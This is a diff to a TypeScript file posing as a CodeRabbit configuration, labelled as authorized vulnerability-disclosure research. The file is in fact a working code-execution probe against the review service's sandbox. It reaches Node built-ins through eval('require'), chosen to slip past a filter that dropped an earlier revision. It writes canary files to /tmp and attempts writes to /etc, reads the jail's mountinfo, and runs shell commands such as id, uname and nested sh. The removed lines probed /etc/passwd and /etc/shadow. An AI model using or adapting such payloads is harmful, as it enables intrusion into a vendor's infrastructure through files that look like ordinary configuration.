@@ -1,14 +1,16 @@
-// CodeRabbit config probe CR-132-INT-E (authorized VDP research on our own PR).
-// Revision E of the cr/tscfg-112-head payload channel (probe 121 revs A-D).
-// GOAL: does the evaluation sandbox permit WRITES where writing would matter, and does
-// node:child_process actually execute a binary?  NOTHING IS WRITTEN, DELETED OR MODIFIED
-// anywhere on disk: the only write-shaped call is fs.accessSync(..., W_OK), a permission
-// query that creates no file.  The only child processes are /bin/true, /bin/sh -c id,
-// /usr/bin/id and test -w, none of which touch the filesystem.
-// No module-loading syntax anywhere (probe 121 rev A was silently dropped for it); Node
-// built-ins are reached through the MODULE-SCOPE require, invisible on globalThis.
+// CodeRabbit config probe CR-132-INT-F (authorized VDP research on our own PR).
+// Revision F of the cr/132-integrity-head payload channel (rev E = writability query).
+// GOAL: is the writable surface real, i.e. does a write actually persist, and does it stay
+// inside the throwaway per-evaluation container?
+// SCOPE OF WRITES: exactly ONE fresh unique canary path under /tmp, read back, then deleted
+// in the same run.  Plus two mandatory write CONTROLS: a write under a nonexistent directory
+// (must be ENOENT) and a write to root-owned /etc (must be EACCES).  The /etc control is
+// cleaned up if it unexpectedly succeeds.  Nothing in the repository checkout, /app, or any
+// CodeRabbit-owned file is written, read for content, or deleted -- /tmp/coderabbit-config.cjs
+// is only listed, never opened for write.
+// No module-loading syntax anywhere; Node built-ins come from the MODULE-SCOPE require.
 
-const MARK = "CR-132-INT-E"
+const MARK = "CR-132-INT-F"
 const R: string[] = []
 
 function clip(v: any, n: number): string {
@@ -24,7 +26,7 @@ function clip(v: any, n: number): string {
 
 function rec(t: string, v: any): void {
   try {
-    R.push(t + "=" + clip(v, 150))
+    R.push(t + "=" + clip(v, 1500))
   } catch (_) {
     /* ignore */
   }
@@ -36,10 +38,7 @@ function safe(t: string, f: () => any): any {
     rec(t, v)
     return v
   } catch (e: any) {
-    rec(
-      t + "!x",
-      e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR",
-    )
+    rec(t + "!x", e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR")
     return undefined
   }
 }
@@ -48,128 +47,101 @@ function errcode(e: any): string {
   return e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR"
 }
 
-// ---- who / where / which jail ------------------------------------------------
-safe("A.proc", () => {
-  const p: any = (globalThis as any).process
-  return (
-    "uid=" + p.getuid() + " gid=" + p.getgid() + " pid=" + p.pid + " ppid=" + p.ppid +
-    " cwd=" + p.cwd() + " execPath=" + p.execPath
-  )
-})
-safe("A.bundle", () => {
-  const d = eval("__dirname")
-  const f = eval("__filename")
-  return "dirname=" + clip(d, 60) + " filename=" + clip(f, 60)
-})
-const rt = safe("B.require", () => eval("typeof require"))
+const rt = safe("A.require", () => eval("typeof require"))
 
 if (rt === "function") {
   const fs: any = eval("require")("node:fs")
-  const C: any = fs.constants
-  rec("C.consts", "F_OK=" + C.F_OK + " R_OK=" + C.R_OK + " W_OK=" + C.W_OK + " X_OK=" + C.X_OK)
+  const p: any = (globalThis as any).process
+  const CAND = "/tmp/cr-132-canary-F1"
+  const CAND2 = "/tmp/cr-132-canary-F2-" + p.pid
 
-  // ---------------- jail identity / freshness --------------------------------
-  safe("C.jail_uuid", () => {
+  safe("A.proc", () => "uid=" + p.getuid() + " pid=" + p.pid + " cwd=" + p.cwd())
+  safe("A.jail_uuid", () => {
     const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
     const g = m.match(/nsjail-[0-9a-f-]+/)
-    return g ? g[0] : "no-nsjail-id::" + clip(m.slice(0, 140), 140)
+    return g ? g[0] : "no-nsjail-id"
   })
-  safe("C.ls_root", () => fs.readdirSync("/").join(","))
-  safe("C.ls_tmp", () => fs.readdirSync("/tmp").join(","))
-  safe("C.cwd_link", () => {
-    try {
-      return fs.readlinkSync("/proc/self/cwd")
-    } catch (e: any) {
-      return "readlink " + errcode(e)
-    }
+  safe("A.ls_tmp_before", () => fs.readdirSync("/tmp").join(","))
+
+  // ---- WRITE CONTROL 1: under a directory that does not exist -> ENOENT ---------
+  safe("W.CTRL1_noent", () => {
+    fs.writeFileSync("/etc/cr-132-no-such-dir-4471/canary", MARK)
+    return "UNEXPECTED_SUCCESS"
   })
 
-  // ---------------- P1a: WRITABILITY QUERY. ZERO writes. ---------------------
-  // W_OK on a directory answers: may this process create/rename entries here?
-  // W_OK on a file answers: may this process truncate/rewrite it?
-  const paths = [
-    "/",
-    "/tmp",
-    "/tmp/coderabbit-config.cjs",
-    "/app",
-    "/app/cr-jail-fs",
-    "/app/cr-gcs-transfer",
-    "/etc",
-    "/etc/passwd",
-    "/etc/hosts",
-    "/home",
-    "/home/jailuser",
-    "/home/jailuser/.cache",
-    "/usr/local/lib/node_modules",
-    "/usr/local/bin/node",
-    "/dev/shm",
-    "/run",
-    "/codegraph-runtime",
-    "/verification-runtime",
-    "/knowledge-embedding-runtime",
-    "/proc/self",
-    // CONTROL 1 -- a path that certainly does not exist, must be ENOENT not success
-    "/etc/cr-132-no-such-dir-4471",
-  ]
-  for (const p of paths) {
-    const k = "W:" + p
-    safe(k, () => {
-      fs.accessSync(p, C.W_OK)
-      return "WRITABLE"
-    })
-  }
-  // same paths, ownership + mode, so every verdict above is explainable
-  for (const p of ["/", "/tmp", "/etc", "/home/jailuser", "/dev/shm", "/usr/local/lib/node_modules", "/tmp/coderabbit-config.cjs"]) {
-    safe("S:" + p, () => {
-      const st = fs.statSync(p)
-      return "mode=" + (st.mode & 4095).toString(8) + " uid=" + st.uid + " gid=" + st.gid + " nlink=" + st.nlink + " ino=" + st.ino + " size=" + st.size
-    })
-  }
-  // CONTROL 2 -- read-only but definitely existing paths must come back denied,
-  // proving this probe discriminates readable from writable
-  for (const p of ["/etc/passwd", "/usr/local/bin/node", "/etc/shadow", "/home"]) {
-    safe("R:" + p, () => {
-      fs.accessSync(p, C.R_OK)
-      return "READABLE"
-    })
-  }
-  // is the repository checkout present in the jail at all?
-  for (const d of ["/.git", "/workspace", "/repo", "/github/workspace", "/src", "/data", "/mnt"]) {
-    safe("C.dir" + d.replace(/\//g, "_"), () => {
-      try {
-        return "DIR " + fs.readdirSync(d).join(",")
-      } catch (e: any) {
-        return "ERR " + errcode(e)
-      }
-    })
-  }
+  // ---- WRITE CONTROL 2: root-owned /etc -> EACCES (proves the write path
+  //      discriminates a writable directory from a read-only one) ------------------
+  safe("W.CTRL2_eacces", () => {
+    fs.writeFileSync("/etc/cr-132-canary-should-fail", MARK)
+    return "UNEXPECTED_SUCCESS size=" + fs.statSync("/etc/cr-132-canary-should-fail").size
+  })
 
-  // ---------------- P1b: does child_process actually EXECUTE? -----------------
-  const cp: any = eval("require")("node:child_process")
-  rec("D.cp_type", typeof cp + " execSync=" + typeof cp.execSync + " spawnSync=" + typeof cp.spawnSync)
-  safe("D.exec_true", () => {
-    const b = cp.execFileSync("/bin/true", [], { timeout: 5000 })
-    return "OK bufferType=" + (b && b.constructor ? b.constructor.name : "?") + " len=" + (b ? b.length : -1)
+  // ---- THE SINGLE CONTAINED CANARY --------------------------------------------
+  safe("W.canary_write", () => {
+    fs.writeFileSync(CAND, MARK + " canary pid=" + p.pid + " t=" + Date.now())
+    const st = fs.statSync(CAND)
+    return "WROTE " + CAND + " ino=" + st.ino + " size=" + st.size + " mode=" + (st.mode & 4095).toString(8)
   })
-  safe("D.exec_sh_id", () => {
-    const s = String(cp.execFileSync("/bin/sh", ["-c", "id"], { timeout: 5000, encoding: "utf8" }))
-    return "OK [" + clip(s, 120) + "]"
+  safe("W.canary_readback", () => {
+    const s = String(fs.readFileSync(CAND, "utf8"))
+    return "readback=[" + clip(s, 200) + "] matchesMarker=" + (s.indexOf(MARK) === 0) + " realpath=" + fs.realpathSync(CAND)
   })
-  safe("D.exec_id_direct", () => {
-    const s = String(cp.execFileSync("/usr/bin/id", [], { timeout: 5000, encoding: "utf8" }))
-    return "OK [" + clip(s, 120) + "]"
+  safe("W.canary_append", () => {
+    fs.appendFileSync(CAND, " appended")
+    const s = String(fs.readFileSync(CAND, "utf8"))
+    return "len=" + s.length + " tail=[" + clip(s.slice(-14), 30) + "]"
   })
-  safe("D.spawn_sh_id", () => {
-    const r = cp.spawnSync("/bin/sh", ["-c", "id; hostname"], { timeout: 5000, encoding: "utf8" })
-    return "status=" + r.status + " err=" + (r.error ? errcode(r.error) : "none") + " out=[" + clip(r.stdout, 110) + "]"
+  safe("W.canary2_write", () => {
+    fs.writeFileSync(CAND2, MARK)
+    return "created " + CAND2 + " exists=" + fs.existsSync(CAND2)
   })
-  // second, independent writability oracle, from a separate process
-  safe("D.sh_test_w", () => {
-    const s = String(cp.execFileSync("/bin/sh", ["-c", "test -w /tmp && echo T || echo F; test -w / && echo T || echo F; test -w /etc && echo T || echo F"], { timeout: 5000, encoding: "utf8" }))
-    return "[" + clip(s, 60) + "]"
+  safe("W.canary_sees_from_child", () => {
+    const cp: any = eval("require")("node:child_process")
+    const r = cp.spawnSync("/bin/sh", ["-c", "ls -l /tmp/cr-132-canary-F1 2>&1; cat /tmp/cr-132-canary-F1 2>&1"], { timeout: 5000, encoding: "utf8" })
+    return "status=" + r.status + " out=[" + clip(r.stdout, 220) + "]"
+  })
+  safe("W.ls_tmp_mid", () => fs.readdirSync("/tmp").join(","))
+
+  // ---- where does a write physically land? container overlay or host storage? ---
+  safe("M.mountinfo", () => {
+    const m = String(fs.readFileSync("/proc/self/mountinfo", "utf8"))
+    const keep = m.split("\n").filter((l) => l.indexOf(" / ") >= 0 || l.indexOf(" /tmp ") >= 0 || l.indexOf(" /dev/shm ") >= 0 || l.indexOf("nsjail") >= 0)
+    return keep.map((l) => l.slice(0, 165)).join(" ~ ").slice(0, 1400)
+  })
+  safe("M.parent_ino", () => "tmp_ino=" + fs.statSync("/tmp").ino + " cand_parent=" + fs.statSync("/tmp").ino)
+
+  // ---- CLEANUP: remove both canaries, restore /tmp to exactly what we found ------
+  safe("C.unlink1", () => {
+    fs.unlinkSync(CAND)
+    return "exists_after_unlink=" + fs.existsSync(CAND)
+  })
+  safe("C.unlink2", () => {
+    if (fs.existsSync(CAND2)) fs.unlinkSync(CAND2)
+    return "exists_after_unlink=" + fs.existsSync(CAND2)
+  })
+  safe("C.unlink_etc_control", () => {
+    if (fs.existsSync("/etc/cr-132-canary-should-fail")) fs.unlinkSync("/etc/cr-132-canary-should-fail")
+    return "etc_canary_absent=" + !fs.existsSync("/etc/cr-132-canary-should-fail")
+  })
+  safe("C.ls_tmp_after", () => fs.readdirSync("/tmp").join(","))
+  safe("C.final_check", () => {
+    const b = fs.statSync("/tmp/coderabbit-config.cjs")
+    return "bundle_ino=" + b.ino + " bundle_size=" + b.size + " bundle_mtime=" + Math.floor(b.mtimeMs)
+  })
+
+  // ---- re-prove exec on a second binary, still no writes ------------------------
+  safe("E.uname", () => {
+    const cp: any = eval("require")("node:child_process")
+    const s = String(cp.execFileSync("/usr/bin/uname", ["-a"], { timeout: 5000, encoding: "utf8" }))
+    return "[" + clip(s, 160) + "]"
+  })
+  safe("E.exec_git", () => {
+    const cp: any = eval("require")("node:child_process")
+    const s = String(cp.execFileSync("/bin/sh", ["-c", "git --version; sh -c 'echo NESTED_OK $((2+3))'"], { timeout: 5000, encoding: "utf8" }))
+    return "[" + clip(s, 160) + "]"
   })
 } else {
-  rec("B.body", "SKIPPED_no_module_scope_require")
+  rec("A.body", "SKIPPED_no_module_scope_require")
 }
 
 export default {
